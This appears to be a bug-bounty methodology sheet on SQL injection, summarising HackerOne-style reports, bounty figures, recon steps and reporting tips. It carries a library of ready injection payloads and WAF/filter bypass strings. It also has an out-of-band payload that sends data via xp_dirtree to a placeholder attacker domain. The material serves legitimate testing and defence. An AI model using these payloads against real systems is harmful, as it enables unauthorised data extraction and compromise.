---
category: sqli
label: SQL Injection (SQLi)
report_count: 203
programs: [grab, indrive, gitlab, eternal, ibb, owncloud, acronis, nextcloud, torproject, h1-ctf]
avg_bounty: 900
max_bounty: 4500
severity_distribution: critical: 10, high: 15, medium: 10, low: 5
---

## Overview

SQL injection breaks the trust boundary between user input and backend data stores, allowing attackers to manipulate queries, exfiltrate data, or achieve code execution. Developers introduce these flaws by interpolating untrusted input into SQL statements, often due to missing parameterization or improper escaping. The worst-case impact is full compromise of application data, authentication bypass, or remote code execution.

## Root causes

- Direct concatenation of user input into SQL queries without parameterization.
- Misuse or misunderstanding of ORM/DBAL APIs that allow raw SQL fragments.
- Inadequate or missing input validation/sanitization on dynamic query components (e.g., ORDER BY, LIMIT, table/column names).
- Trusting client-supplied data in backend logic (e.g., mobile content providers, admin panels).
- Overexposed endpoints or features (e.g., debug APIs, plugin shortcodes) that accept arbitrary user input.
- Legacy code or third-party libraries/plugins with unsafe query construction patterns.

## Attack surface

- Query parameters, POST bodies, and JSON fields used in database queries (`{id}`, `{search}`, `{order}`, `{filter}`, `{where}`, `{limit}`, `{offset}`, `{sort}`, `{token}`).
- HTTP headers processed by backend logic (e.g., `User-Agent`, `X-Forwarded-For`).
- Path segments mapped to query values (RESTful APIs: `/api/{resource}/{id}`).
- Features: search boxes, filters, admin panels, reporting/export tools, authentication flows, AJAX endpoints, content providers (mobile), plugin shortcodes.
- Endpoint patterns: anything that reflects user input in SQL errors or alters query results.
- Tech stacks: PHP (raw SQL, legacy plugins), Node.js (custom query builders, ORMs), Java (JDBC, Hibernate with HQL), Python (Django raw(), SQLAlchemy text()), Ruby (ActiveRecord .find_by_sql), Android/iOS content providers.
- Client-side hints: JS code that passes user input directly to API endpoints, mobile apps with exported content providers, plugins exposing dynamic query parameters.

## Recon checklist

1. Enumerate all endpoints and parameters (including hidden, JSON, and header-based).
2. Identify features accepting user input for filtering, sorting, or searching.
3. Review API schemas and mobile manifests for exported content providers or queryable URIs.
4. Inspect client-side code for dynamic query construction or direct parameter mapping.
5. Check for plugins, themes, or third-party modules with custom query logic.
6. Probe for error messages or stack traces revealing SQL syntax or backend details.
7. Map authenticated vs. unauthenticated access to sensitive query endpoints.
8. Identify endpoints that accept arbitrary field/table names, order/limit, or raw SQL fragments.

## Hunt methodology

1. Send baseline requests with benign input to all identified parameters and observe responses.
2. Inject single/double quotes, parentheses, and SQL comment markers to detect syntax errors.
3. Test boolean-based payloads (`1 OR 1=1`, `1 AND 1=2`) to observe logic changes in responses.
4. Use time-based payloads (`SLEEP({n})`, `pg_sleep({n})`) to detect blind injection via response delays.
5. Attempt error-based payloads (`extractvalue()`, `updatexml()`, invalid casts) to trigger verbose SQL errors.
6. Probe for injection in HTTP headers and unconventional fields (e.g., `User-Agent`, JSON keys).
7. For mobile/content providers, use tools like Drozer to inject into projection/selection arguments.
8. Escalate to stacked queries or out-of-band payloads (e.g., DNS exfiltration) if the backend supports it.

## Payload library

### Classic In-Band Injection
**Technique**: Directly alters query logic to return more data or bypass controls.
**How to apply**: Inject into any parameter used in a SQL WHERE clause.
**Payload**: `1 OR 1=1--`  
**Observe**: Expanded results, authentication bypass, or data leakage.
**Seen in**: Search/filter features, login forms, RESTful resource lookups.

### Boolean-Based Blind Injection
**Technique**: Uses conditional logic to infer data based on response differences.
**How to apply**: Inject boolean expressions and compare responses for true/false.
**Payload**: `1 AND (SELECT SUBSTRING(version(),1,1))='5'--`  
**Observe**: Different content or status code depending on condition.
**Seen in**: REST APIs, mobile app endpoints, AJAX handlers.

### Time-Based Blind Injection
**Technique**: Triggers time delays to confirm injection when no output is visible.
**How to apply**: Inject time-based functions and measure response latency.
**Payload**: `1 OR SLEEP(5)--` or `'; IF(1=1,SLEEP(5),0)--`  
**Observe**: Noticeable delay in server response.
**Seen in**: JSON API parameters, POST bodies, headers.

### Error-Based Injection
**Technique**: Forces SQL errors to leak backend details or data.
**How to apply**: Inject functions that cause errors or verbose output.
**Payload**: `1 OR updatexml(null,concat(0x3a,user()),null)--`  
**Observe**: SQL error messages in response with leaked data.
**Seen in**: Forms, AJAX endpoints, admin panels.

### Out-of-Band (OOB) Injection
**Technique**: Leverages functions that trigger external interactions (e.g., DNS).
**How to apply**: Inject payloads that cause the database to make external requests.
**Payload**: `'; exec master.dbo.xp_dirtree '\\{attacker_domain}\share'--`  
**Observe**: DNS or HTTP requests to attacker-controlled infrastructure.
**Seen in**: File upload handlers, email fields, admin features.

### Header Injection
**Technique**: Injects SQL payloads via HTTP headers processed by backend logic.
**How to apply**: Set headers like `User-Agent` to SQLi payloads.
**Payload**: `Mozilla/5.0'XOR(if(now()=sysdate(),sleep(5),0))OR'`  
**Observe**: Delayed response or error indicating header is parsed in SQL.
**Seen in**: Logging features, analytics, CSV/JSON importers.

### Mobile Content Provider Injection
**Technique**: Exploits Android/iOS content providers by injecting into selection/projection.
**How to apply**: Use tools to send crafted queries to exported providers.
**Payload**: `* FROM sqlite_master WHERE type='table';--`  
**Observe**: Disclosure of table names, data, or errors.
**Seen in**: Android apps with exported content providers.

### Query Structure Manipulation (ORDER BY, LIMIT, etc.)
**Technique**: Injects into query structure parameters to alter sorting or pagination.
**How to apply**: Supply crafted input to `{order}`, `{limit}`, `{offset}` fields.
**Payload**: `id ASC, (SELECT CASE WHEN (SUBSTRING(user(),1,1)='r') THEN 1 ELSE 2 END)`  
**Observe**: Changed order, errors, or data leakage.
**Seen in**: Sorting/filtering features, plugin shortcodes, ORM query builders.

## Filter & WAF bypass

- Use inline comments: `1/**/OR/**/1=1--`
- URL-encode or double-encode payloads: `%27%20OR%201=1--`
- Use alternate whitespace: tabs, newlines, `%0a`, `%09`
- Case variation: `SeLeCt`, `UnIoN`
- Use database-specific functions: `SLEEP()`, `pg_sleep()`, `dbms_pipe.receive_message()`
- Bypass quote filters: `1' OR '1'='1`, `1") OR ("1"="1`
- Exploit parameter pollution or array parameters: `param[]=1&param[]=OR 1=1--`
- Use null bytes (`%00`) or Unicode homoglyphs to evade input filters.
- For error-based: use functions like `extractvalue()`, `updatexml()`, or type confusion.

## Verification & impact

- **Confirmed vulnerable**: Data returned that should not be accessible, authentication bypass, time delays, SQL error messages, or OOB interactions (DNS/HTTP callbacks).
- **False positive signals**: Generic 500 errors without evidence of SQL parsing, input reflected but not executed, or errors unrelated to SQL syntax.
- **Impact escalation**: Use SQLi to extract credentials, escalate to RCE via database procedures, pivot to other systems, or chain with IDOR/auth bypass for full account takeover.

## Triage & severity

- **Typical CVSS**: High to Critical (7.5–10.0), depending on exploitability and data sensitivity.
- **Severity up**: Unauthenticated access, access to PII/credentials, ability to write/modify data, RCE via database procedures, or OOB exfiltration.
- **Severity down**: Requires authentication, limited to non-sensitive data, sandboxed database user, or only DoS possible.

## Reporting tips

- Provide a minimal, reproducible PoC (raw request + payload + observed effect).
- Clearly state the parameter/field and feature affected.
- Include screenshots or logs showing data leakage, bypass, or timing differences.
- Avoid reports based only on error messages without proof of exploitability.
- Evidence checklist: request/response pairs, payloads used, observed impact, screenshots (if applicable), and any relevant logs or OOB callbacks.

## Real examples

- 273946 — grab: SQLi in WordPress plugin shortcode parameter, unauthenticated, full DB read (high, $4500)
- 2051931 — indrive: Blind SQLi in REST API path segment, conditional response, PostgreSQL version leak (critical, $4134)
- 298176 — gitlab: SQLi in order parameter of finder class, exploited via sorting, user email extraction (critical, $2000)
- 838855 — eternal: Blind SQLi via POST body, time-based extraction, full DB access (critical, $2000)
- 923020 — acronis: Authenticated API SQLi, admin panel, full DB dump via SQLMap (high, $250)
- 297478 — gsa_bbp: SQLi via User-Agent header, time-based blind, confirmed via response delay (critical, $0)
- 374748 — hannob: SQLi in blog software, admin config fields, arbitrary DB read (high, $0)
- 1650264 — owncloud: SQLi in Android content provider, local app-to-app data exfiltration (medium, $300)
- 518669 — nextcloud: SQLi in mobile content provider, query restriction bypass, table data leak (low, $100)
- 844428 — eternal: SOLR query injection via GET param, limited exploitability (low, $100)

## Bounty intelligence

Payouts for SQLi range from $100 for low-impact or authenticated findings (e.g., mobile content providers, limited scope) to $4,500+ for unauthenticated, high-impact, or full DB compromise. SaaS, fintech, and large enterprise programs pay the most, especially for unauthenticated or blind SQLi with data exfiltration or RCE potential. Reports with clear exploitability, unauthenticated access, and demonstrated data extraction consistently earn the highest rewards.